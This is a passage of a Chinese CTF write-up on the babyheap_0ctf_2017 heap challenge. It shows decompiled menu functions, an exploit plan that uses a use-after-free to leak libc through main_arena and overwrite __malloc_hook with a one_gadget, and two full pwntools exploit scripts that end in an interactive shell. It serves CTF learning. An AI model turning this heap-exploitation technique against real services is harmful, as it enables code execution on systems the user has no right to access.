+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>));
+</span></span><span style="display:flex;"><span>      result <span style="color:#f92672">=</span> <span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1;
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(result <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>作用是清空对应的堆块</p>
+
+<h4 id="选择4" data-numberify>选择4：<a class="anchor ms-1" href="#选择4"></a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">dump</span>(<span style="color:#66d9ef">__int64</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v2; <span style="color:#75715e">// [rsp+1Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Index: &#34;</span>);
+</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">gets</span>();
+</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> result;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> result <span style="color:#f92672">+</span> a1);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( result <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Content: &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_130F</span>(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(<span style="color:#ae81ff">24LL</span> <span style="color:#f92672">*</span> v2 <span style="color:#f92672">+</span> a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>),);<span style="color:#75715e">//输出从*(_QWORD *)(24LL * v2 + a1 + 16)开始 *(_QWORD *)(24LL * v2 + a1 + 8)个字符
+</span></span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">puts</span>(byte_14F1);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>其中<code>sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8))</code>跟前面的输入函数一样是一个很友好的输出函数：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_130F</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// [rsp+10h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">ssize_t</span> v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( v3 <span style="color:#f92672">&lt;</span> a2 )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)(v3 <span style="color:#f92672">+</span> a1), a2 <span style="color:#f92672">-</span> v3);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( v4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">+=</span> v4;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span><span style="color:#a6e22e">_errno_location</span>() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">11</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">_errno_location</span>() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> v3;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+<h4 id="选择5" data-numberify>选择5：<a class="anchor ms-1" href="#选择5"></a></h4>
+<p>return 0；</p>
+
+<h3 id="利用" data-numberify>利用：<a class="anchor ms-1" href="#利用"></a></h3>
+<p>神仙发言仅作参考：(不过他的动调写的还挺好：babyheap_0ctf_2017-CSDN博客)
+==堆题的做法无非就是利用各种绕过去获得libc的偏移，然后去修改malloc_hook或者free_hook为system函数，最后去触发获取shell==
+不过对于前期应该没什么问题。他的函数定义也挺好</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dbg</span>():
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(p)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Size: &#34;</span>,str(size))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, content):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Size: &#34;</span>,str(len(content)))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Content: &#34;</span>,content)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#————————————————</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#版权声明：本文为CSDN博主「djhtdjdywgjc」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#原文链接：https://blog.csdn.net/djhtdjdywgjc/article/details/129701870</span>
+</span></span></code></pre></div><hr>
+
+<h3 id="利用思路" data-numberify>利用思路：<a class="anchor ms-1" href="#利用思路"></a></h3>
+<p>（1）搞几个堆块
+（2）uaf改fd，想办法输出什么地址搞到libcbase
+（3）用malloc_hook来getshell
+至于exploit中的mainarena说白了就是大于0x80的chunk释放之后存到unsortedbin中时fd指针存在了mainarena+0x58也就是mainarena+88中。详见main_arena + 88是什么
+关于libc的泄露还可以参考
+泄露libc地址的原理详解&ndash;以babyheap_0ctf_2017为例
+那个神秘的0x4526a是onegaget:one_gadget,它不是一个函数名，而是一个 <strong>在特定版本的 libc 中，能直接执行 <code>/bin/sh</code> 的“魔法地址</strong></p>
+<hr>
+
+<h3 id="exp1" data-numberify>exp1：<a class="anchor ms-1" href="#exp1"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span><span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context(log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>,arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./babyheap&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#p=remote(&#39;node5.buuoj.cn&#39;,27442)</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">alloc</span>(size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Command:&#39;</span>,str(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size:&#39;</span>,str(size))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fill</span>(index,size,content):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Command:&#39;</span>,str(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index:&#39;</span>,str(index))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Size:&#39;</span>,str(size))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Content:&#39;</span>,content)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Command:&#39;</span>,str(<span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index:&#39;</span>,str(index))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Command:&#39;</span>,str(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index:&#39;</span>,str(index))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)<span style="color:#f92672">+</span>p8(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>fill(<span style="color:#ae81ff">0</span>,len(payload),payload)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)
+</span></span><span style="display:flex;"><span>fill(<span style="color:#ae81ff">3</span>,len(payload),payload)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x10</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>fill(<span style="color:#ae81ff">3</span>,len(payload),payload)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>dump(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>mainarena88<span style="color:#f92672">=</span>u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>mainarena<span style="color:#f92672">=</span>mainarena88<span style="color:#f92672">-</span><span style="color:#ae81ff">88</span>
+</span></span><span style="display:flex;"><span>malloc_hook<span style="color:#f92672">=</span>mainarena<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>LibcSearcher(<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>,malloc_hook)
+</span></span><span style="display:flex;"><span>libcbase<span style="color:#f92672">=</span>malloc_hook<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(malloc_hook<span style="color:#f92672">-</span><span style="color:#ae81ff">35</span>)
+</span></span><span style="display:flex;"><span>fill(<span style="color:#ae81ff">2</span>,len(payload),payload)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0x60</span>)
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span>libcbase<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4526a</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+</span>p8(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(system)
+</span></span><span style="display:flex;"><span>fill(<span style="color:#ae81ff">6</span>,len(payload),payload)
+</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+<h3 id="exp2" data-numberify>exp2:<a class="anchor ms-1" href="#exp2"></a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>,log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = process(&#39;./babyheap&#39;)</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;node4.buuoj.cn&#39;</span>,<span style="color:#ae81ff">27874</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./babyheap&#39;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.23.so&#39;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dbg</span>():
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(p)
+</span></span><span style="display:flex;"><span>    pause()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Size: &#34;</span>,str(size))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(index, content):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Size: &#34;</span>,str(len(content)))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;Content: &#34;</span>,content)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">3</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Command: &#34;</span>,str(<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;Index: &#34;</span>,str(index))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#0</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#1</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#3</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)   <span style="color:#75715e">#4</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)<span style="color:#f92672">+</span>p8(<span style="color:#ae81ff">0x80</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>,payload)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x21</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>,payload)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#4  2</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x10</span>)   <span style="color:#75715e">#2  1</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x91</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>,payload)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x80</span>)   <span style="color:#75715e">#5  </span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>show(<span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>malloc_hook<span style="color:#f92672">=</span>u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">88</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>
+</span></span><span style="display:flex;"><span>print(hex(malloc_hook))
+</span></span><span style="display:flex;"><span>base<span style="color:#f92672">=</span>malloc_hook<span style="color:#f92672">-</span>libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__malloc_hook&#39;</span>]
+</span></span><span style="display:flex;"><span>print(hex(base))
+</span></span><span style="display:flex;"><span>system<span style="color:#f92672">=</span><span style="color:#ae81ff">0x4526a</span><span style="color:#f92672">+</span>base
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>)   <span style="color:#75715e">#4</span>
+</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">3</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x71</span>)<span style="color:#f92672">+</span>p64(malloc_hook<span style="color:#f92672">-</span><span style="color:#ae81ff">0x23</span>)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">3</span>,payload)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>)   <span style="color:#75715e">#4</span>
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x60</span>)   <span style="color:#75715e">#6</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#ae81ff">0x13</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">+</span>p64(system)
+</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">6</span>,payload)
+</span></span><span style="display:flex;"><span>add(<span style="color:#ae81ff">0x20</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># dbg()</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+<h3 id="堆简单的利用" data-numberify>堆简单的利用：<a class="anchor ms-1" href="#堆简单的利用"></a></h3>
+<p>首先申请几个堆块，比方说5个。
+free第二第三个chunk，在第一个chunk中存数据完成UAF，更改第三个chunk的fd指向第四个chunk。
+再次申请两个chunk，也就是重新申请第二第三个chunk。
+再free第四个chunk。此时dump第二个chunk拿到第四个chunk的fd，以此搞到libc_base.
+借libc_base和malloc_hook获取shell（这部分有点神秘，没见binsh，一个system到底是怎么搞到shell的）</p>
+
+<h1 id="补上实践的过程" data-numberify>补上实践的过程。<a class="anchor ms-1" href="#补上实践的过程"></a></h1>
+
+<h4 id="如果不加add80确实会和topchunk合并" data-numberify>如果不加add（80）确实会和topchunk合并<a class="anchor ms-1" href="#如果不加add80确实会和topchunk合并"></a></h4>
+<p>Pasted image 20260407201547.png</p>
+
+<h4 id="实操时libc版本还是libcsearcher比较稳定" data-numberify>实操时libc版本还是libcsearcher比较稳定。<a class="anchor ms-1" href="#实操时libc版本还是libcsearcher比较稳定"></a></h4>
+</div>
+</div>
+</div><div class="card-footer">
+  <div class="post-navs d-flex justify-content-evenly"><div class="post-nav post-prev">
